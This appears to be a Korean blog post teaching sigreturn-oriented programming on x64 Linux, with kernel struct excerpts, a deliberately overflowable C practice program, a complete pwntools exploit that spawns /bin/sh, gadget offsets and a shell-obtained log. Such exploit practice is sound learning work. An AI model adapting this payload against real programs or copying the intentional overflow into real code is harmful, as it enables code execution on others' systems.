---
title: Sigreturn-oriented programming technique practice
tags: [pwnable, srop, x64]
style: 
color: 
description: Let's look at Sigreturn-oriented programming technique
---
<br>

> SROP(Sigreturn-oriented programming)
> > SROP는 sigreturn 시스템 콜을 이용하여 레지스터에 원하는 값을 저장할 수 있습니다. <br>
해당 기법을 이용하여 원하는 시스템 함수를 호출할 수 있습니다.

<br>
sigreturn() 시스템 함수는 restore_sigcontext()함수를 호출하는데, sigcontext 구조체의 값을 통해 함수에 전달된다. 이 과정을 통해서 레지스터에 원하는 값을 복사할 수 있다.<br>
이를 통해 rax에 원하는 syscall 번호를 넣고 syscall을 할 수 있다.
<br>
<br>

아래는 restore_sigcontext() 함수의 소스이다.

``` c
static int restore_sigcontext(struct pt_regs *regs, struct sigcontext __user *sc, unsigned long uc_flags){
...
#ifdef CONFIG_X86_64
        COPY(r8);
        COPY(r9);
        COPY(r10);
        COPY(r11);
        COPY(r12);
        COPY(r13);
        COPY(r14);
        COPY(r15);
#endif /* CONFIG_X86_64 */
 
        COPY_SEG_CPL3(cs);
        COPY_SEG_CPL3(ss);
 
#ifdef CONFIG_X86_64
        /*
         * Fix up SS if needed for the benefit of old DOSEMU and
         * CRIU.
         */
        if (unlikely(!(uc_flags & UC_STRICT_RESTORE_SS) &&
                 user_64bit_mode(regs)))
            force_valid_ss(regs);
#endif
...
}
```
<br>

아래는 sigcontext 구조체 형태이다.

``` c
# else /* __x86_64__: */
struct sigcontext {
    __u64               r8;
    __u64               r9;
    __u64               r10;
    __u64               r11;
    __u64               r12;
    __u64               r13;
    __u64               r14;
    __u64               r15;
    __u64               rdi;
    __u64               rsi;
    __u64               rbp;
    __u64               rbx;
    __u64               rdx;
    __u64               rax;
    __u64               rcx;
    __u64               rsp;
    __u64               rip;
    __u64               eflags;     /* RFLAGS */
    __u16               cs;
    __u16               gs;
    __u16               fs;
    union {
        __u16           ss; /* If UC_SIGCONTEXT_SS */
        __u16           __pad0; /* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
    };
    __u64               err;
    __u64               trapno;
    __u64               oldmask;
    __u64               cr2;
    struct _fpstate __user      *fpstate;   /* Zero when no FPU context */
#  ifdef __ILP32__
    __u32               __fpstate_pad;
#  endif
    __u64               reserved1[8];
};
```

익스플로잇을 진행할 때 ucontext 함수를 실행하는데, 이 함수에서 5byte를 넣어줘야하므로 주의해야한다. 

``` c
struct ucontext_x32 {
    unsigned int      uc_flags;
    unsigned int      uc_link;
    compat_stack_t    uc_stack;
    unsigned int      uc__pad0;     /* needed for alignment */
    struct sigcontext uc_mcontext;  /* the 64-bit sigcontext type */
    compat_sigset_t   uc_sigmask;   /* mask last for extensibility */
};
```

<br>

## Example Code

``` c
//gcc -fno-stack-protector -o srop64 srop64.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 512);
}

void main(){
    seteuid(getuid());
    write(1,"Hello SROP\n",12);
    vuln();
}
```
<br>

## Exploit

``` python
from pwn import *

p = process('./srop64')
e = ELF('./srop64')
libc = e.libc 

p.recvuntil('Printf() address : ')
printf_addr = int(p.recv(14), 16)
libc_base = printf_addr - libc.sym['printf']
poprax = libc_base + 0x43ae8
syscall = libc_base + 0x13c0
binsh = libc_base + libc.search("/bin/sh").next()

log.info('printf_addr = ' + str(hex(printf_addr)))
log.info('libc_base = ' + str(hex(libc_base)))
log.info('poprax = ' + str(hex(poprax)))
log.info('syscall = ' + str(hex(syscall)))
log.info('binsh = ' + str(hex(binsh)))

payload = 'A' * 72
payload += p64(poprax)
payload += p64(0xf) # x64 sigreturn() call number
payload += p64(syscall)

#ucontext
payload += p64(0x0) * 5
 
#sigcontext
payload += p64(0x0)     #R8
payload += p64(0x0)     #R9
payload += p64(0x0)     #R10
payload += p64(0x0)     #R11
payload += p64(0x0)     #R12
payload += p64(0x0)     #R13
payload += p64(0x0)     #R14
payload += p64(0x0)     #R15
 
payload += p64(binsh)   #RDI
payload += p64(0x0)     #RSI
payload += p64(0x0)     #RBP
payload += p64(0x0)     #RBX
payload += p64(0x0)     #RDX
payload += p64(0x3b)    #RAX
payload += p64(0x0)     #RCX
payload += p64(syscall) #RSP
payload += p64(syscall) #RIP
payload += p64(0x0)     #eflags
payload += p64(0x33)    #cs
payload += p64(0x0)     #gs
payload += p64(0x0)     #fs
payload += p64(0x2b)    #ss

p.send(payload)

p.interactive()
```

컴파일 하고 나서 libc 버전이 달라서 버전에 맞게 오프셋을 찾아줬다. <br>

``` sh
lourcode@lourcode:/lib/x86_64-linux-gnu$ ROPgadget --binary libc-2.27.so | grep "pop rax ; ret"
0x0000000000043ae8 : pop rax ; ret
```

``` sh
lourcode@lourcode:/lib/x86_64-linux-gnu$ ROPgadget --binary libc-2.27.so | grep "syscall"
0x00000000000013c0 : syscall
```

<br>
Code Segment와 Stack Segment의 값은 x86과 x64가 다르므로 주의해야한다.

### x64 CS, SS

|Purpose|Segment|
|---|---|
|User Code|0x33|
|User Data / Stack|0x2b|

<br>

``` sh
lourcode@lourcode:~/ShareFolder/example$ python srop64.py
[+] Starting local process './srop64': pid 13463
[*] '/home/lourcode/ShareFolder/example/srop64'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] u'/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] printf_addr = 0x7fe741311f70
[*] libc_base = 0x7fe7412ad000
[*] poprax = 0x7fe7412f0ae8
[*] syscall = 0x7fe7412ae3c0
[*] binsh = 0x7fe741460e1a
[*] Switching to interactive mode

$ id
uid=1000(lourcode) gid=1000(lourcode) groups=1000(lourcode),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```
쉘을 획득했다.<br><br>

## 참고

[Lazeca](https://www.lazenca.net/display/TEC/02.SROP%28Sigreturn-oriented+programming%29+-+x64)
<br>

### GG

I'm so stupid

